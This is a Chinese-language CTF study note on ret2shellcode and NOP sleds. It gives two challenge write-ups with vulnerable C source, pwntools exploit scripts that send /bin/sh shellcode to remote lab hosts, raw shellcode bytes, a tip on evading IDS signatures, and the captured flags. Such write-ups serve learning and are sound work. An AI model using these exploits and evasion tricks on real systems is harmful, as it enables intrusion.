#### pwn方向上shellcode的学习

shellcode是由被劫持指针（EIP/RIP）执行的一段机器码，目的是得到一个shell。

##### -关于ret2shellcode，这个考点的前提就是控制返回地址指向shellcode的所在区域：

1. 栈（或注入区域）必须具有**可执行权限**。
2. 通常需要**关闭 ASLR**，否则栈地址随机化会让精确指向变得不可行。
3. 在 ret2shellcode 中通常通过劫持 EIP/RIP 跳转到 shellcode 所在的可执行区域。

简单我的理解就是靠栈溢出得到执行权限，这个权限会指向我们构成得到shellcode的机器码`/bin/sh`得到shell权限。

##### - 关于滑梯（NOP Sled）：对抗地址不确定性的缓冲区

NOP（No-Operation）指令在执行时不改变程序状态。如果在 shellcode 前面填充大量 NOP 指令，那么只要覆盖的返回地址落在**这片 NOP 区域的任意位置**，CPU 就会逐条执行 NOP，“滑”到末尾的 shellcode 入口。

这本质上是用**空间换取命中概率**：原本需要精确命中 shellcode 开头（可能只有几十字节），现在只需要命中一个被扩大到数百甚至数千字节的 NOP 区域。

实践中，NOP Sled 通常由**非规范 NOP** 构成（如 `xchg eax, eax`、`add eax, 0` 等），因为连续的标准 `\x90` 字节极易被 IDS/杀软的特征规则识别。此外，NOP Sled 也常被用于**对齐**：当 shellcode 长度小于缓冲区大小时，用 NOP 填充剩余空间，确保返回地址覆盖在正确的偏移上。

在 ret2shellcode 场景中，Payload 的典型布局是：`[ NOP Sled ][ Shellcode ][ 重复的返回地址（指向 NOP 区域）]`。

- ###### shellcode工坊 (Shellcode Workshop)（青岑）

  依旧老东西。

  ```bash
  ?????????
  ```

  不不不，这个不是老东西，它给的附件是C语言的源代码，我去，什么情况？看看：

  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  
  void init() {
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
  }
  
  void vuln() {
      char buf[100];
      printf("Welcome to the Shellcode Workshop!\n");
      printf("Here is a hint for you: buf is at %p\n", buf);
      printf("Leave your mark on the stack: ");
      read(0, buf, 0x200);  // Read way more than buf size -> overflow
      printf("Your work is done.\n");
  }
  
  int main() {
      init();
      vuln();
      return 0;
  }
  ```

  通过这个程序的逻辑我们可以注意到`buf`还有`printf("Leave your mark on the stack: ")`，在这之后我们梳理，这个程序会先执行`main`函数，`main`函数会先执行`init`，接着执行`vuln`函数，重点在`vuln`里面。
  
  `vuln`的`buf`有100的可溢出量（这个溢出不是那种垃圾数据，我们要进行“滑坡”），我们可以用它执行shellcode。
  
  根据提示`printf("Here is a hint for you: buf is at %p\n", buf)`我们可以知道，应该在这里截取`buf`的类似地址的东西，并在`payload`构造时使用。在检测到`("Leave your mark on the stack: ")`后发送`payload`。
  
  编写试一下：
  
  ```python
  from pwn import *
  context(arch='amd64',os='linux')
  p=remote('docker.qingcen.net',46511)
  p.recvuntil(b'buf is at ')
  buf=int(p.recvline().strip(),16)
  shellcode=asm(shellcraft.sh())
  payload=shellcode.ljust(120,b'\x90')+p64(buf)
  p.recvuntil(b'Leave your mark on the stack: ')
  p.send(payload)
  p.interactive()
  ```
  
  这个是可以打通的，同时经过测验，我们也可以把`context`删去，用可视化shellcode（64位）来注入，这里最要命的就是`buf`地址的偏移距离，我问大肥鱼告诉我一般是自己要汇编，然后看栈地址计算，要是不想算也就`112`和`120`两个常见值可以试试。关于那个`buf`就是提取后面的输出范围了。最后得到flag。
  
  ​							`flag{cdca2b9b-4b00-43cc-b076-998f4d242459}`

- ###### **ret2shellcode**（青岑）

  checksec一下。

  ```bash
      Arch:       amd64-64-little
      RELRO:      Partial RELRO
      Stack:      Canary found
      NX:         NX enabled
      PIE:        No PIE (0x3fe000)
      Stripped:   No
  ```

  开了栈溢出保护，没开PIE，却开了个Partial RELRO。这个功能主要是防止覆写？但是不防函数调用的`.got.plt`？

  丢进ida看看。

  ```c
  int __fastcall main(int argc, const char **argv, const char **envp)
  {
    char s[104]; // [rsp+0h] [rbp-70h] BYREF
    unsigned __int64 v5; // [rsp+68h] [rbp-8h]
  
    v5 = __readfsqword(0x28u);
    memset(s, 0, 0x60uLL);
    init();
    puts("A peculiar feature in C language");
    read(0, s, 0x60uLL);
    printf(s);
    puts("Again?");
    read(0, s, 0x80uLL);
    printf(s);
    return 0;
  }
  ```

  还有：

  ```c
  char buf[0x100];                        // 全局(.bss)
  
  int main() {
      init();
      puts("have a good time");
      mprotect((size_t)buf & ~0xfff, 0x1000, 7);   // buf 所在页 -> RXW
      read(0, buf, 0x100);                          // 读入我们的 shellcode
      for (int i = 0; i <= 0x100; i++)
          if (buf[i] == 0x90) { puts("No nop"); exit(0); }
      ((void(*)())buf + (get_random_number() % 0x50 + 0x50))();  // 跳进 buf 随机偏移
      return 0;
  }
  ```

  分析：`printf(s)`出现两次，大概就是用`got`，但是这里有`puts("No nop")`，这里会检查滑梯`\x90`，我们不能用常见的`shellcraft.sh().rjust(0x100, b'\x90')`。寻找其它替代的就有`\x50``\x40`之类的。用64位的shellcode，除了我之后脚本的，还可以用`31 f6 48 bb 2f 62 69 6e 2f 2f 73 68 56 53 54 5f 6a 3b 58 31 d2 0f 05`。

  `buf[0:0xa0]` 填 `\x50`，shellcode 放 `0xa0`，整体补齐 `0x100`。入口最坏落在 `0x9f`（或 `0x4f`），进入 `\x50` 区段后一路滑到 `0xa0`。

  运用脚本：

  ```python
  from pwn import *
  p=remote('docker.qingcen.net',35090)
  shellcode=b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
  payload = (b'\x50' * 0xa0 + shellcode).ljust(0x100, b'\x50')
  #构造滑梯，\x90被禁止了，其它的也不行好像，这里的ljust就是输入这么多，也就是个命令用法。
  p.recvuntil(b'have a good time')
  p.send(payload)
  p.interactive()
  ```

  得到flag：`flag{0d287b85-e491-473a-91aa-cdad4a44e469}`。
